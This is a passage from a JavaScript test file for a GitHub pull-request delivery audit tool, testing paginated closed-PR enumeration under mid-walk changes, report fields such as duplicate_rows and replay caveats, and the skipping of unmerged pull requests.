    gh: async () => ({ total_count: 0 }),
    ghCount: async () => counts[i++],
  };
  await assert.rejects(
    () =>
      auditRepo(
        client,
        { owner: 'praetorian-inc', callerFile: 'c.yml', callerPath: '.github/workflows/c.yml', since: '2026-05-01', until: null },
        'guard',
      ),
    /SHRANK during the walk \(250 -> 249\)/,
  );
  assert.equal(i, 2, 'the walk must be BRACKETED — one probe before and one after');
});

test('auditRepo: CONTROL — a closed-PR list that GREW mid-walk is NOT refused', async () => {
  // The opposite direction, and the one that makes the check above meaningful
  // rather than a tripwire that fires on any mutation. With direction=asc a PR
  // closing mid-walk joins at its CREATION position, which is at or after the
  // cursor, so nothing already read shifts out of reach — at worst a row is
  // served twice and ghPaged dedupes it. Refusing on that would turn every busy
  // repo's audit into an exit-2 unknown for an event that loses nothing.
  //
  // The walk returns the 250 rows that existed when it started — NOT the 251 the
  // list holds by the end. That is the realistic shape (the row that closed
  // mid-walk joined behind the cursor), and it is the case the shortfall check
  // below has to tolerate: its floor is deliberately the BEFORE count, because
  // measuring against the after count would demand a row the walk could not have
  // reached and turn ordinary churn into exit 2.
  const counts = [250, 251];
  let i = 0;
  const client = {
    ghPaged: async () => closedRows(250),
    gh: async () => ({ total_count: 0 }),
    ghCount: async () => counts[i++],
  };
  const res = await auditRepo(
    client,
    { owner: 'praetorian-inc', callerFile: 'c.yml', callerPath: '.github/workflows/c.yml', since: '2026-05-01', until: null },
    'guard',
  );
  assert.equal(res.repo, 'guard');
  assert.equal(i, 2);
});

test('auditRepo: a merged row the FIRST walk skipped is recovered by the UNION with a second walk', async () => {
  // The round-21 finding the count brackets cannot see, reproduced against the
  // real client in scratchpad/r10/netted-repro.mjs: a reopen BEFORE the cursor
  // netted by a close AFTER it leaves closedBefore === closedAfter and
  // fetched.length >= closedBefore while a merged PR was never read — both
  // brackets pass, FALSE CLEAN. Counts cannot close a positional skip; the
  // union of two walks does, because a merged PR cannot be reopened and so
  // never leaves the closed list — a fresh second enumeration rereads the row
  // the shift carried past the first walk's cursor.
  //
  // The fixture is that exact mutation, seen from the walk's side. Walk A is
  // the netted snapshot: 250 rows, merged #101 shifted past the cursor and a
  // compensating unmerged #251 at the tail. Walk B is the list as it stands:
  // 250 rows, #101 present, reopened #50 gone. Both count probes read 250.
  // Under a single walk this audit reported merged_prs=0 with every check
  // green — which is what the walk-count assertion below pins: a mutant that
  // drops walk B reads 1 pulls walk AND loses #101, so both arms go red.
  const mergedRow = pr(101, '2026-06-01T00:00:00Z', 'f'.repeat(40));
  const others = Array.from({ length: 250 }, (_, k) => ({ number: k + 1, merged_at: null })).filter(
    (r) => r.number !== 101,
  );
  const tail = { number: 251, merged_at: null };
  const walkASnapshot = [...others, tail];
  const walkBSnapshot = [...others.filter((r) => r.number !== 50), mergedRow, tail];
  let pullsWalks = 0;
  const client = {
    ghPaged: async (path) => {
      if (path.includes('/pulls?')) {
        pullsWalks++;
        return pullsWalks === 1 ? walkASnapshot : walkBSnapshot;
      }
      if (path.includes('/commits?')) return [];
      if (path.includes('/runs?')) return [];
      throw new Error(`unexpected ghPaged ${path}`);
    },
    gh: async (path) => {
      if (path.includes('per_page=1&created=')) return { total_count: 0 };
      if (path.includes('/contents/')) return { type: 'file' };
      throw new Error(`unexpected gh ${path}`);
    },
    ghCount: async () => 250,
  };
  const res = await auditRepo(
    client,
    { owner: 'praetorian-inc', callerFile: 'c.yml', callerPath: '.github/workflows/c.yml', since: '2026-05-01', until: null },
    'guard',
  );
  assert.equal(pullsWalks, 2, 'the closed-PR enumeration must walk TWICE — the union is the fix');
  assert.equal(res.merged_prs, 1, 'the skipped merged row must be recovered, not silently absent');
  const classified = Object.values(res.classes)
    .flat()
    .map((r) => r.number);
  assert.ok(
    classified.includes(101),
    `merged #101 must be CLASSIFIED, not merely counted — got ${JSON.stringify(classified)}`,
  );
});

test('buildReport: duplicate_rows is always reported, so the insertion branch is observable', () => {
  // The soundness argument for the closed-PR walk says an insertion is benign
  // because a re-served row is deduped "and counted as state.dupes". Round 17
  // counted them and reported them NOWHERE, which makes the claim unfalsifiable:
  // there was no output in which a mid-walk insertion left any trace at all.
  const results = [repoResult('guard', { merged: 1, delivered: [rec(1)] })];
  assert.equal(buildReport(results, CFG, 7, 3).duplicate_rows, 3);

  // UNCONDITIONAL, not omitted-when-zero. A consumer cannot distinguish "no
  // duplicates" from "this field is not emitted by that version" if the key
  // disappears, which is the same reasoning that keeps api_calls always present.
  const zero = buildReport(results, CFG, 7, 0);
  assert.equal('duplicate_rows' in zero, true);
  assert.equal(zero.duplicate_rows, 0);
  // And a caller that has not been updated yet reports 0 rather than undefined,
  // which would render as `null` in the JSON document.
  assert.equal(buildReport(results, CFG, 7).duplicate_rows, 0);
});

test('buildReport: replay_caveats are gated on an actual REPLAY, in parity with the markdown', () => {
  // Round 17's own fix, reviewed: it unified the caveat TEXT across the two
  // channels and left the GATES divergent. renderMarkdown skips them per repo on
  // `!g.replay.length`; the JSON emitted them whenever `gaps.length` — so a
  // report whose only defect is `payload_missing` (a gap, but never replayable,
  // since replayList excludes it) printed no caveat in markdown while emitting
  // all three in JSON beside an empty `replay: []`. Every caveat is about the
  // consequences of replaying, so attaching them to a document that asks for no
  // replay trains a machine consumer to ignore them.
  const onlyPayloadMissing = buildReport(
    [repoResult('guard', { merged: 1, payload_missing: [rec(42)] })],
    CFG,
    1,
  );
  // Fixture guard: this must genuinely be a GAP with an EMPTY replay, or the
  // assertion below passes for the wrong reason.
  assert.equal(onlyPayloadMissing.repos_with_gaps.length, 1);
  assert.deepEqual(onlyPayloadMissing.repos_with_gaps[0].replay, []);
  assert.equal('replay_caveats' in onlyPayloadMissing, false);
  // Parity asserted against the OTHER channel derived from the same document,
  // not restated by hand — that is the property the round-17 fix claimed.
  assert.equal(
    renderMarkdown(onlyPayloadMissing, CFG).includes(`> ${REPLAY_CAVEATS[0].text}`),
    false,
  );

  // CONTROL: a gap that IS replayable still carries them, in both channels. A
  // gate tightened until it never fires suppresses the prod-write warning
  // entirely, which is worse than the drift being fixed.
  const replayable = buildReport(
    [repoResult('guard', { merged: 1, never_fired: [rec(42)] })],
    CFG,
    1,
  );
  assert.deepEqual(replayable.repos_with_gaps[0].replay, [42]);
  assert.deepEqual(
    replayable.replay_caveats.map((c) => c.id),
    REPLAY_CAVEATS.map((c) => c.id),
  );
  assert.ok(renderMarkdown(replayable, CFG).includes(`> ${REPLAY_CAVEATS[0].text}`));
});

test('classify: an UNMERGED pull request is skipped, never classified never_fired', () => {
  // Latent rather than live — auditRepo filters on merged_at before calling — but
  // classify is exported, pure, and reused, and the harm is asymmetric: an
  // unmerged PR has no delivery to look for, so it lands in never_fired, and
  // never_fired IS the replay list. A closed-unmerged PR would be replayed into
  // the prod metrics queue as if it had merged.
  const NOWISH = Date.UTC(2026, 6, 1, 0, 0, 0);
  const unmerged = [{ number: 5, merged_at: null, head: { sha: 'unmergedsha0000' } }];
  const c = classify(unmerged, new Map(), null, NOWISH);
  for (const k of CLASS_KEYS) {
    assert.deepEqual(c[k], [], `an unmerged PR must not appear in "${k}"`);
  }

  // ANTI-VACUOUS control: the SAME fixture with a merge date does reach the
  // classifier and does land in never_fired, so the empty result above is the
  // skip and not a fixture that classify was never going to see.
  const merged = [{ ...unmerged[0], merged_at: '2026-06-01T00:00:00Z' }];
  const c2 = classify(merged, new Map(), null, NOWISH);
  assert.deepEqual(
    c2.never_fired.map((r) => r.number),
    [5],
  );
});
